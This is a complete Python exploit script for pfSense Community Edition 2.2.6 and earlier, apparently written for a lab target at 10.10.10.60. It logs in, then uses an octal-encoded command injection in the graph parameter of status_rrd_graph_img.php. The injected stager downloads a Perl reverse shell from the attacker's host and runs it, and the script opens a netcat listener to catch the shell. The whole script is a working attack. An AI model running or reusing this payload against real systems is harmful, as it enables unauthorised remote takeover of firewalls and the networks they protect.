#!/usr/bin/python
import sys
import time
import argparse
import requests
import threading
import subprocess

parser = argparse.ArgumentParser()
parser.add_argument(
    '-u',
    '--user',
    dest='username',
    action='store',
    required=True,
    help='Username of the PfSense control panel'
)

parser.add_argument(
    '-p',
    '--pass',
    dest='password',
    action='store',
    required=True,
    help='Password of the PfSense control panel'
)

parser.add_argument(
    '-l',
    '--lhost',
    dest='lhost',
    action='store',
    required=True,
    help='Local host of the attacker'
)

parser.add_argument(
    '-f',
    '--file',
    dest='rshell',
    action='store',
    required=True,
    help='Path of the reverse perl reverse shell'
)

args = parser.parse_args()

_RED = '\x1b[1;31m'
_BLU = '\x1b[1;34m'
_GRE = '\x1b[1;32m'
_RST = '\x1b[0;0;0m'

successMessage = lambda x: '{}[+]{} {}'.format(_GRE, _RST, x)
errorMessage = lambda x: '{}[-]{} {}'.format(_RED, _RST, x)
infoMessage = lambda x: '{}[*]{} {}'.format(_BLU, _RST, x)

def encoder():
    stager = 'echo \'<?php $shell = file_get_contents("http://' + args.lhost + args.rshell + '");' + 'file_put_contents("rshell.pl", $shell);' + 'system("chmod 755 rshell.pl && perl rshell.pl"); ?> \' > shellexec'

    
    encoded = ''
    for c in stager:
        encoded += "\\\\%03d" %(int(oct(ord(c))))
    return encoded

def listener():
    subprocess.call(['nc -lnvp 7734'], shell=True)

def sender(s, url):
    s.get(url, verify=False)

print infoMessage('pfSense Community Edition <= 2.2.6 exploit')
# Disable SSL error
requests.packages.urllib3.disable_warnings()

# Create a session
s = requests.Session()

# The targeted server
target = 'https://10.10.10.60/'

payload = {
    'usernamefld': args.username,
    'passwordfld': args.password,
    'login': 'Login'
}
print infoMessage('Trying to log in the control panel...')
resp = s.post(target + '/installer/installer.php', data=payload, verify=False)
if resp.status_code != 200:
    print errorMessage('Not able to log in the control panel')
    sys.exit(1)

print successMessage('Successfully loged in the control panel')
print '\tPHPSESSID={}\n'.format(s.cookies['PHPSESSID'])

print infoMessage('Sending the PHP stage...')
exploit = encoder()
stager = target + 'status_rrd_graph_img.php?database=-throughput.rrd&graph=file|printf \'' + exploit + '\'|sh|echo '

resp = s.get(stager, verify=False)
if resp.status_code != 200:
    print errorMessage('Ooooups something goes wrong!')
    sys.exit(1)

print successMessage('First stage successfully sent!\n')

print infoMessage('Triggering the exploit...')
time.sleep(3)
url = target + 'status_rrd_graph_img.php?database=-throughput.rrd&graph=file|php+shellexec|echo+'
thread1 = threading.Thread(target=listener)
thread2 = threading.Thread(target=sender, args=(s, url,))

thread1.start()
thread2.start()


